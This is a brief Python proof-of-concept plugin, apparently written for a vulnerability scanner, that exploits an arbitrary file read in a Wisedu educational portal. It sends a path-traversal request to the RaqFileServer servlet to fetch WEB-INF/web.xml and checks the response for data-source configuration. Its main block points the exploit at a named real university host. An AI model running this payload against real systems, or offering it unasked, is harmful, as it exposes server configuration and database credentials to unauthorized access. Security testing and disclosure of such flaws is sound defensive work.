#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name: 金智教育门户信息系统存在任意文件读取
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0121332
#Author:xq17
def assign(service, arg):
    if service == "wisedu_elcs":
        return True, arg

def audit(arg):
    payload = arg + "epstar/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml"
    code, head, res, errcode, _ = curl.curl2(payload)
    if code ==200 and 'logConfig' in res and 'dataSource' in res:
         security_info(payload+':Any reading ' )
         
if __name__ == '__main__':
        from dummy import *
        audit(assign('wisedu_elcs','http://ssgl.whu.edu.cn/')[1])